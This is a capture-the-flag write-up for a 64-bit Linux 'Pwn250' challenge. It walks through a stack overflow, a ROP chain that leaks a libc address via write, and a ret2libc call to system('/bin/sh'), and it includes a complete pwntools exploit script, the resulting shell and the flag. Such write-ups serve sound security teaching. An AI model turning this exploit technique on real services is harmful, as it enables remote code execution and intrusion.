# Pwn250 (pwnage 250)
Author: muffinx

Description:

```
Oh, you can still solve this too?
please try harder

task : nc 54.153.19.139 5255
libc : https://drive.google.com/file/d/0B5gmSy61RokzSFk1clNoWGRveWs/
```

Binary type:

```
pwn250: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b92b9ef9aa21452b83be93778ed175c6c37de92d, not stripped
```

Binary security measurements:

```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```


The code is pretty straight forward:
```c++

ssize_t here()
{
  char buf; // [sp+0h] [bp-80h]@1

  return read(0, &buf, 0x100uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  here();
  write(1, "Hello, World\n", 0xDuLL);
  return 0;
}
```

We also got a libc.so from the challenge, so we'll do some ret2libc.
First we need to locate where the libc is loaded, so we can use it for ret2libc.

We use rop to leak the address of read in the .got.plt, we then subtract it with the
offset of read in the libc.so to get the loaded libc adress.

We'll do this by using the write function, here's an example how it is used by the application to
print "Hello, World":

```
.text:00000000004005AB                 mov     edx, 13         ; n
.text:00000000004005B0                 mov     esi, offset aHelloWorld ; "Hello, World\n"
.text:00000000004005B5                 mov     edi, 1          ; fd
.text:00000000004005BA                 call    _write
```

edx = holds number of bytes to write
esi = holds the address to read
edi = where to write the bytes to (file descriptor)

We can set these values by using this wonderful rop gadget:

```
0x000000000040056a : pop rdi ; pop rsi ; pop rdx ; ret
```

So we set:

rdx = 0x8 (read 8 bytes)
rsi = 0x0601020 (read got.plt)
rdi = 0x01 (stdout)

Now jumping to write, we have successfully leaked libc.
To pause the program and to make a second overflow, we jump back into the vulnerable function "here" @ 0x0400571.

After that, with the calculated libc base address, we can do a classical ret2libc.

```
0x0400633 # pop rdi ; ret
*address of /bin/sh*
*address of system*
```

Here's my exploit:

```python

#!/usr/bin/env python

from pwn import *

#libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
libc = ELF('./libc.so')

#r = process('./pwn250')
r = remote('54.153.19.139', 5255)

#gdb.attach(r, '''
#set follow-fork-mode child
#break *0x0400591
#continue
#continue
#''')

payload = 'A'*136
payload += p64(0x040056a) # pop rdi ; pop rsi ; pop rdx ; ret
payload += p64(0x01) # rdi = 1 (fd)
payload += p64(0x0601020) # rsi -> read got.plt
payload += p64(0x08) # rdx = 8 (number of byte)
payload += p64(0x0400430) # write
payload += p64(0x0400571) # here()

r.sendline(payload)


addr_unpacker = make_unpacker(64, endian='little', sign='unsigned')

leaked_read_addr = r.recv(8)
# rebase libc
libc.address = addr_unpacker(leaked_read_addr) - libc.symbols['read']

print 'leaked read at: ' + hex(libc.symbols['read'])
print 'leaked system at: ' + hex(libc.symbols['system'])
print 'leaked /bin/sh at: ' + hex(next(libc.search('/bin/sh\x00')))


payload2 = 'A'*136
payload2 += p64(0x0400633) # pop rdi ; ret
payload2 += p64(next(libc.search('/bin/sh\x00'))) # rdi -> /bin/sh
payload2 += p64(libc.symbols['system']) # system

r.sendline(payload2)
r.interactive()
```

Oh, we got a shell!

```
$ cat /home/pwn250/flag
Bugs_Bunny{Did_Ropgadget_help_pwner!_maybe_we_have_smart_guys_here!!}
```
